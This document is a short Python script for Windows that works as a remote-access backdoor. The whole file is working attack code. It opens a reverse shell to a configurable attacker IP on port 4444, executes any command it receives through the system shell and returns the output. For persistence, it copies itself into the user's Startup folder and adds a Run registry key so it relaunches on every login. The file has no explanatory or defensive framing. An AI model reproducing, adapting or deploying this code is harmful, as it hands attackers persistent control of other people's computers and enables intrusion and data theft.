import socket
import subprocess
import winreg as reg
import os
import sys
import shutil
import time

# Configuration for the reverse shell
ATTACKER_IP = 'ip address of attacker'
ATTACKER_PORT = 4444

# Name for the registry entry
ENTRY_NAME = "MyPythonScript"


def reverse_shell():
    while True:
        try:
            # Create socket and attempt to connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            print("Connected to the attacker.")

            # If connected, handle commands
            while True:
                command = s.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    break
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                s.send(output.encode('utf-8'))

            s.close()
            break  # Exit while loop if connection is closed properly

        except (socket.error, ConnectionRefusedError) as e:
            print(f"Connection failed: {e}. Retrying in 10 seconds...")
            time.sleep(10)  # Wait for 10 seconds before retrying


def add_to_startup():
    try:
        # Determine the path to the current executable
        exe_path = os.path.abspath(sys.executable)

        # Ensure the executable path is copied to a safe location if necessary
        startup_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        if not os.path.exists(startup_path):
            os.makedirs(startup_path)
        target_exe_path = os.path.join(startup_path, os.path.basename(exe_path))

        # Copy the executable to the startup folder (if not already there)
        if exe_path != target_exe_path:
            shutil.copy(exe_path, target_exe_path)

        # Open the registry key for modification
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, ENTRY_NAME, 0, reg.REG_SZ, target_exe_path)
        reg.CloseKey(key)
    except Exception as e:
        print(f"Failed to add to startup: {e}")


if __name__ == "__main__":
    add_to_startup()
    reverse_shell()
